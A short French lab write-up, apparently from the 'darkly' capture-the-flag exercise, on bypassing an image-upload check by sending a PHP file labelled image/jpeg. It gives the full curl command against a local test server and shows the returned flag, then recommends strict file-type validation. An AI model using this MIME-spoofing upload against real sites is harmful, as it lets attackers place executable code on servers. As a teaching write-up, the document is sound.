Dans la page qui permet d'envoyer une image on va chercher a envoyer un fichier qui est du code.

Pour cela on vient préciser dans notre curl le type, et on force le site a croire que c'est une image alors que j'envoie un fichier php vide.
Mettre du code dans ce fichier est de toute évidence dangeureux pour le site.

Solution : verifier le type de fichier, n'autoriser que les images.
curl -s -X POST -F "uploaded=@/home/ajoliet/Documents/darkly/upload_img/ressources/test.php;type=image/jpeg" -F "Upload=Upload" "http://127.0.0.1:8080/index.php?page=upload" | grep 'flag'
<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/test.php succesfully uploaded.</pre>
